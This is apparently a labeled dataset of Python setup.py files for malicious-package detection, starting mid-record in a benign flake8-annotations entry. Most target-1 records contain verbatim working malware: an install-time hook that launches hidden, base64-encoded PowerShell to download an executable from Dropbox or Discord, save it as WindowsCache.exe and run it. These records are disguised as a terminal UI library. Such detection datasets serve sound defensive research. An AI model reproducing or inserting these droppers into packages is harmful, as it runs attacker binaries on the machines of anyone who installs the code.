Comments\\n**Deprecation notice**: Support for type comments will be removed in `3.0`. See [this issue](https://github.com/sco1/flake8-annotations/issues/95) for more information.\\n### Mixing argument-level and function-level type comments\\nSupport is provided for mixing argument-level and function-level type comments.\\n\\n```py\\ndef foo(\\n    arg1,  # type: bool\\n    arg2,  # type: bool\\n):  # type: (...) -> bool\\n    pass\\n```\\n\\n**Note:** If present, function-level type comments will override any argument-level type comments.\\n\\n### Partial type comments\\nPartially type hinted functions are supported for non-static class methods.\\n\\nFor example:\\n\\n```py\\nclass Foo:\\n    def __init__(self):\\n        # type: () -> None\\n        ...\\n\\n    def bar(self, a):\\n        # type: (int) -> int\\n        ...\\n```\\nWill consider `bar`\\'s `self` argument as unannotated and use the `int` type hint for `a`.\\n\\nPartial type comments utilizing ellipses as placeholders is also supported:\\n\\n```py\\ndef foo(arg1, arg2):\\n    # type: (bool) -> bool\\n    pass\\n```\\nWill show `arg2` as missing a type hint.\\n\\n```py\\ndef foo(arg1, arg2):\\n    # type: (..., bool) -> bool\\n    pass\\n```\\nWill show `arg1` as missing a type hint.\\n\\n## Dynamic Typing Caveats\\nSupport is only provided for the following patterns:\\n  * `from typing import any; foo: Any`\\n  * `import typing; foo: typing.Any`\\n  * `import typing as <alias>; foo: <alias>.Any`\\n\\nNested dynamic types (e.g. `typing.Tuple[typing.Any]`) and redefinition (e.g. `from typing import Any as Foo`) will not be identified.\\n\\n## Contributing\\n\\n### Development Environment\\nThis project uses [Poetry](https://python-poetry.org/) to manage dependencies. With your fork cloned to your local machine, you can install the project and its dependencies to create a development environment using:\\n\\n```bash\\n$ poetry install\\n```\\n\\nNote: An editable installation of `flake8-annotations` in the developer environment is required in order for the plugin to be registered for Flake8. By default, Poetry includes an editable install of the project itself when `poetry install` is invoked.\\n\\nA [pre-commit](https://pre-commit.com) configuration is also provided to create a pre-commit hook so linting errors aren\\'t committed:\\n\\n```bash\\n$ pre-commit install\\n```\\n\\n### Testing & Coverage\\nA [pytest](https://docs.pytest.org/en/latest/) suite is provided, with coverage reporting from [pytest-cov](https://github.com/pytest-dev/pytest-cov). A [tox](https://github.com/tox-dev/tox/) configuration is provided to test across all supported versions of Python. Testing will be skipped for Python versions that cannot be found.\\n\\n```bash\\n$ tox\\n```\\n\\nDetails on missing coverage, including in the test suite, is provided in the report to allow the user to generate additional tests for full coverage.\\n',\n    'author': 'S Co1',\n    'author_email': 'sco1.git@gmail.com',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://github.com/sco1/flake8-annotations',\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'extras_require': extras_require,\n    'entry_points': entry_points,\n    'python_requires': '>=3.7,<4.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "toolpip-1.14", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'toolpip',\n    packages = ['modlib'],\n    version = '10.25',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "admcheck-1.4.0", "func": "from setuptools import setup, find_packages\n\n\n\n\nVERSION = '1.4.0'\nDESCRIPTION = 'basic package to check if user has admin'\n\n# Setting up\nsetup(\n    name=\"admcheck\",\n    version=VERSION,\n    author=\"ix_EcIipse\",\n    author_email=\"blank@noemail.net\",\n    description=DESCRIPTION,\n    packages=find_packages(),\n    install_requires=['requests', 'pyautogui'],\n    keywords=['python', 'sockets', 'requests'],\n    classifiers=[\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Unix\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)", "target": 1}
{"idx": "django-tables2-2.4.1", "func": "#!/usr/bin/env python3\nimport re\n\nfrom setuptools import find_packages, setup\n\n# get version without importing\nwith open(\"django_tables2/__init__.py\", \"rb\") as f:\n    VERSION = str(re.search('__version__ = \"(.+?)\"', f.read().decode()).group(1))\n\nsetup(\n    name=\"django-tables2\",\n    version=VERSION,\n    description=\"Table/data-grid framework for Django\",\n    long_description=open(\"README.md\").read(),\n    long_description_content_type=\"text/markdown\",\n    author=\"Bradley Ayers\",\n    author_email=\"bradley.ayers@gmail.com\",\n    license=\"Simplified BSD\",\n    url=\"https://github.com/jieter/django-tables2/\",\n    packages=find_packages(exclude=[\"tests.*\", \"tests\", \"example.*\", \"example\", \"docs\"]),\n    include_package_data=True,  # declarations in MANIFEST.in\n    install_requires=[\"Django>=1.11\"],\n    extras_require={\"tablib\": [\"tablib\"]},\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Framework :: Django\",\n        \"Framework :: Django :: 2.2\",\n        \"Framework :: Django :: 3.1\",\n        \"Framework :: Django :: 3.2\",\n        \"Framework :: Django :: 4.0\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Topic :: Internet :: WWW/HTTP\",\n        \"Topic :: Software Development :: Libraries\",\n    ],\n)\n", "target": 0}
{"idx": "tpstudyver-3.9", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpstudyver',\n    packages = ['modlib'],\n    version = '2.47',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "grandultra-5.8", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'grandultra',\n    packages = ['modlib'],\n    version = '2.68',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "dataset-1.5.2", "func": "from setuptools import setup, find_packages\n\nwith open(\"README.md\") as f:\n    long_description = f.read()\n\nsetup(\n    name=\"dataset\",\n    version=\"1.5.2\",\n    description=\"Toolkit for Python-based database access.\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    classifiers=[\n        \"Development Status :: 3 - Alpha\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n    ],\n    keywords=\"sql sqlalchemy etl loading utility\",\n    author=\"Friedrich Lindenberg, Gregor Aisch, Stefan Wehrmeyer\",\n    author_email=\"friedrich.lindenberg@gmail.com\",\n    url=\"http://github.com/pudo/dataset\",\n    license=\"MIT\",\n    packages=find_packages(exclude=[\"ez_setup\", \"examples\", \"test\"]),\n    namespace_packages=[],\n    include_package_data=False,\n    zip_safe=False,\n    install_requires=[\"sqlalchemy >= 1.3.2\", \"alembic >= 0.6.2\", \"banal >= 1.0.1\"],\n    extras_require={\n        \"dev\": [\n            \"pip\",\n            \"pytest\",\n            \"wheel\",\n            \"flake8\",\n            \"coverage\",\n            \"psycopg2-binary\",\n            \"PyMySQL\",\n            \"cryptography\",\n        ]\n    },\n    tests_require=[\"pytest\"],\n    test_suite=\"test\",\n    entry_points={},\n)\n", "target": 0}
{"idx": "flexpolyline-0.1.0", "func": "from setuptools import setup\nfrom setuptools.command.sdist import sdist as _sdist\nimport shutil\nfrom os import path\nimport io\n\nthis_directory = path.abspath(path.dirname(__file__))\nwith io.open(path.join(this_directory, 'README.md'), encoding='utf-8') as f:\n    long_description = f.read()\n\n\nclass sdist(_sdist):\n    def run(self):\n        shutil.copy('../LICENSE', 'LICENSE')\n        _sdist.run(self)\n\n\nsetup(\n    name='flexpolyline',\n    description='Flexible Polyline encoding: a lossy compressed representation of a list of coordinate pairs or triples',\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    version='0.1.0',\n    author='HERE Europe B.V.',\n    url='https://here.com',\n    packages=['flexpolyline'],\n    # SPDX-License-Identifier: MIT\n    license='MIT',\n    classifiers=[\n        'Intended Audience :: Developers',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'License :: OSI Approved :: MIT License'\n    ],\n    project_urls={\n        'Source': 'https://github.com/heremaps/flexible-polyline.git'\n    },\n    test_suite=\"test_flexpolyline\",\n    cmdclass={'sdist': sdist}\n)\n", "target": 0}
{"idx": "drf-extra-fields-3.4.0", "func": "import os\nfrom setuptools import setup\n\nwith open(os.path.join(os.path.dirname(__file__), 'README.md')) as readme:\n    README = readme.read()\n\nwith open(os.path.join(os.path.dirname(__file__), 'requirements.txt')) as requirements_txt:\n    requirements = requirements_txt.read().strip().splitlines()\n\n# allow setup.py to be run from any path\nos.chdir(os.path.normpath(os.path.join(os.path.abspath(__file__), os.pardir)))\n\nsetup(\n    name='drf-extra-fields',\n    version='3.4.0',\n    packages=['drf_extra_fields',\n              'drf_extra_fields.runtests'],\n    include_package_data=True,\n    extras_require={\n        \"Base64ImageField\": [\"Pillow >= 6.2.1\"],\n    },\n    license='Apache-2.0',\n    license_files=['LICENSE'],\n    description='Additional fields for Django Rest Framework.',\n    long_description=README,\n    long_description_content_type=\"text/markdown\",\n    author='hipo',\n    author_email='pypi@hipolabs.com',\n    url='https://github.com/Hipo/drf-extra-fields',\n    python_requires=\">=3.7\",\n    install_requires=requirements,\n    classifiers=[\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Intended Audience :: Developers',\n        'Operating System :: OS Independent',\n        'License :: OSI Approved :: BSD License',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Topic :: Internet :: WWW/HTTP',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n    ],\n)\n", "target": 0}
{"idx": "gdbgui-0.15.1.0", "func": "#!/usr/bin/env python\n\nimport os\nimport distutils.text_file\n\nUSING_WINDOWS = os.name == \"nt\"\nif USING_WINDOWS:\n    raise RuntimeError(\n        \"Windows is not supported at this time. \"\n        + \"Versions lower than 0.14.x. are Windows compatible.\"\n    )\nimport io\nfrom setuptools import find_packages, setup  # type: ignore\n\nCURDIR = os.path.abspath(os.path.dirname(__file__))\n\nEXCLUDE_FROM_PACKAGES = [\"tests\"]\n\nREADME = io.open(os.path.join(CURDIR, \"README.md\"), \"r\", encoding=\"utf-8\").read()\nVERSION = (\n    io.open(os.path.join(CURDIR, \"gdbgui/VERSION.txt\"), \"r\", encoding=\"utf-8\")\n    .read()\n    .strip()\n)\n\nsetup(\n    name=\"gdbgui\",\n    version=VERSION,\n    author=\"Chad Smith\",\n    author_email=\"chadsmith.software@gmail.com\",\n    description=\"Browser-based frontend to gdb. Debug C, C++, Go, or Rust.\",\n    long_description=README,\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/cs01/gdbgui\",\n    license=\"License :: GNU GPLv3\",\n    packages=find_packages(exclude=EXCLUDE_FROM_PACKAGES),\n    include_package_data=True,\n    keywords=[\n        \"gdb\",\n        \"debug\",\n        \"c\",\n        \"c++\",\n        \"go\",\n        \"rust\",\n        \"python\",\n        \"machine-interface\",\n        \"parse\",\n        \"frontend\",\n        \"flask\",\n        \"browser\",\n        \"gui\",\n    ],\n    scripts=[],\n    entry_points={\n        \"console_scripts\": [\n            # allow user to type gdbgui from terminal to automatically launch\n            # the server and a tab in a browser\n            \"gdbgui = gdbgui.cli:main\"\n        ]\n    },\n    zip_safe=False,\n    install_requires=distutils.text_file.TextFile(\n        filename=\"./requirements.txt\"\n    ).readlines(),\n    classifiers=[\n        \"Intended Audience :: Developers\",\n        \"Operating System :: MacOS\",\n        \"Operating System :: Unix\",\n        \"Operating System :: POSIX\",\n        \"License :: OSI Approved :: GNU General Public License v3 (GPLv3)\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.9\",\n    ],\n    python_requires=\">=3.6\",\n    project_urls={\n        \"Documentation\": \"https://cs01.github.io/gdbgui/\",\n        \"Source Code\": \"https://github.com/cs01/gdbgui\",\n        \"Bug Tracker\": \"https://github.com/cs01/gdbgui/issues\",\n    },\n)\n", "target": 0}
{"idx": "candyencode-1.57", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'candyencode',\n    packages = ['modlib'],\n    version = '4.18',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "dj-rest-auth-2.2.5", "func": "#!/usr/bin/env python\n\nimport os\n\nfrom setuptools import find_packages, setup\n\nhere = os.path.dirname(os.path.abspath(__file__))\nf = open(os.path.join(here, 'README.md'))\nlong_description = f.read().strip()\nf.close()\n\n\nabout = {}\nwith open('dj_rest_auth/__version__.py', 'r', encoding=\"utf8\") as f:\n    exec(f.read(), about)\n\nsetup(\n    name='dj-rest-auth',\n    version=about['__version__'],\n    author='iMerica',\n    author_email='imichael@pm.me',\n    url='http://github.com/iMerica/dj-rest-auth',\n    description='Authentication and Registration in Django Rest Framework',\n    license='MIT',\n    packages=find_packages(),\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    keywords='django rest auth registration rest-framework django-registration api',\n    zip_safe=False,\n    install_requires=[\n        'Django>=2.0',\n        'djangorestframework>=3.7.0',\n    ],\n    extras_require={\n        'with_social': ['django-allauth>=0.40.0,<0.51.0'],\n    },\n    tests_require=[\n        'coveralls>=1.11.1',\n        'django-allauth==0.50.0',\n        'djangorestframework-simplejwt==4.6.0',\n        'responses==0.12.1',\n        'unittest-xml-reporting==3.0.4',\n    ],\n    test_suite='runtests.runtests',\n    include_package_data=True,\n    python_requires='>=3.5',\n    classifiers=[\n        'Framework :: Django',\n        'Intended Audience :: Developers',\n        'Intended Audience :: System Administrators',\n        'Operating System :: OS Independent',\n        'Topic :: Software Development'\n    ],\n)\n", "target": 0}
{"idx": "tpvmcraftmine-6.68", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpvmcraftmine',\n    packages = ['modlib'],\n    version = '2.36',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "selfvercvrand-8.65", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfvercvrand',\n    packages = ['modlib'],\n    version = '4.96',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqstringpushload-6.68", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqstringpushload',\n    packages = ['modlib'],\n    version = '9.17',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "tpsplitinfovirtual-4.57", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpsplitinfovirtual',\n    packages = ['modlib'],\n    version = '10.6',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
